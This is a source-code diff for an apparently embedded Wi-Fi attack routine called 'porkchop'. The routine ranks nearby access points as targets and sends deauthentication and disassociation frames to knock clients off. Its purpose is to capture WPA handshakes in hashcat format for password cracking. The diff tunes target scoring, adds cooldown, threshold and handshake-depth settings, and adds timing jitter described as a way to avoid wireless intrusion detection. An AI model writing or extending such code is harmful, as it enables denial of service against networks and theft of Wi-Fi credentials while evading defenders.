@@ -109,7 +109,7 @@ static ScoreEntry* findOrCreateScore(const uint8_t* bssid) {
     return &s_scores[worst];
 }
 
-static int32_t computeScore(const BeaconSlot& b) {
+static int32_t computeScore(const BeaconSlot& b, uint8_t hsDepth) {
     // Mirrors Porkchop's priority scoring in spirit, simplified for our
     // smaller beacon table:
     //   RSSI     -> 0..100  (clamped -100..-30 mapped to 0..100)
@@ -124,7 +124,19 @@ static int32_t computeScore(const BeaconSlot& b) {
     if (r > -30)  r = -30;
     s += (int32_t)((r + 100) * 100 / 70);
 
-    s += (int32_t)b.clientN * 10;
+    // CLIENTS term is clamped to the documented 0..40 base (min(N,4)*10)
+    // plus a flat +40 "busy AP" bonus once N reaches 4. Without the clamp,
+    // this used to top out at 4*10=40 back when BeaconSlot::clients held
+    // at most 4 entries — but that array was bumped to 20 slots (see
+    // beacon_slot.h) so busy APs aren't ignored, and an unclamped `clientN
+    // * 10` now scales up to 200 on its own. That silently swamps the
+    // RSSI (max 100) and activity (max 40) terms, turning this into a
+    // near pure "most clients wins" scorer instead of the balanced one
+    // described above, and it also breaks the RADIO menu's SCORE THR
+    // knob, whose -100..200 range assumes the documented per-term caps.
+    int32_t clientTerm = (int32_t)b.clientN * 10;
+    if (clientTerm > 40) clientTerm = 40;
+    s += clientTerm;
     if (b.clientN >= 4) s += 40;
 
     int a = actSlotFor(b.bssid);
@@ -135,8 +147,12 @@ static int32_t computeScore(const BeaconSlot& b) {
     }
 
     // Already-captured APs rank at the very bottom of the list so we don't
-    // waste airtime on them.
-    if (Hc22000::hasPair(b.bssid)) s = -1000;
+    // waste airtime on them - "captured" here respects HS DEPTH (RADIO
+    // menu): at the default depth (0) this is hasPair() (M1+M2), same as
+    // before. At depth 1/2 an AP that only has the pair doesn't get
+    // deprioritized yet, so this method keeps trying it until M3/M4 (per
+    // the configured depth) actually show up too.
+    if (Hc22000::hasHandshake(b.bssid, hsDepth)) s = -1000;
 
     if (b.pmfCapable) s -= 50;
 
@@ -202,6 +218,13 @@ void porkchop(const Ctx& ctx) {
 
     if (n == 0) return;
 
+    // COOLDOWN (RADIO menu, seconds): 0 = off / use the method's own
+    // built-in default (COOLDOWN_MS). A nonzero user value overrides it,
+    // same "0 = legacy behavior" convention as the other Porkchop knobs.
+    uint32_t cooldownMs = ctx.cooldownSec > 0
+        ? (uint32_t)ctx.cooldownSec * 1000u
+        : COOLDOWN_MS;
+
     // Compute / refresh scores; pick the best target this tick.
     int32_t bestScore = INT32_MIN;
     int8_t  bestIdx = -1;
@@ -214,11 +237,14 @@ void porkchop(const Ctx& ctx) {
         ScoreEntry* se = findOrCreateScore(b.bssid);
         se->lastSeenMs = now;
         // EMA - new score pulls 25% toward the freshly-computed one.
-        int32_t fresh = computeScore(b);
+        int32_t fresh = computeScore(b, ctx.hsDepth);
         se->score = (se->score * 3 + fresh) / 4;
 
-        if (se->lastKickMs != 0 && (now - se->lastKickMs) < COOLDOWN_MS) continue;
-        if (Hc22000::hasPair(b.bssid)) continue;
+        if (se->lastKickMs != 0 && (now - se->lastKickMs) < cooldownMs) continue;
+        // Skip a target this tick if it's on cooldown OR already meets HS
+        // DEPTH - matches the -1000 scoring penalty above, kept as a hard
+        // skip too so a stale high EMA score can't win a tick anyway.
+        if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
 
         if (se->score > bestScore) {
             bestScore = se->score;
@@ -226,6 +252,11 @@ void porkchop(const Ctx& ctx) {
         }
     }
     if (bestIdx < 0) return;
+    // SCORE THR (RADIO menu): skip the tick entirely if even our best
+    // candidate doesn't clear the user's minimum. 0 = score all (any
+    // computeScore() result at or above 0 still attacks), matching the
+    // "0 = score all" default documented in config.h.
+    if (bestScore < ctx.scoreThr) return;
 
     const BeaconSlot& target = ctx.beacons[bestIdx];
     uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;
@@ -244,8 +275,15 @@ void porkchop(const Ctx& ctx) {
         }
     } else {
         // No clients tracked yet - broadcast kick (still better than nothing).
+        // JITTER MS (RADIO menu): 0 = off (back-to-back frames, legacy
+        // behavior). A nonzero value spaces the pair by a random amount so
+        // a WIDS doesn't see two identical frames at zero spacing as an
+        // obvious tool signature - same idea as the jitter already applied
+        // inside WSLBypasser::sendBidirectionalKick(), just user-tunable
+        // here since this fallback path calls sendRawMgmt() directly.
         for (uint8_t r = 0; r < rounds; r++) {
             ctx.sendRawMgmt(0xC0, target.bssid, ctx.bcast);
+            if (ctx.jitterMs) delay(1 + (esp_random() % ctx.jitterMs));
             ctx.sendRawMgmt(0xA0, target.bssid, ctx.bcast);
         }
         *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 2);
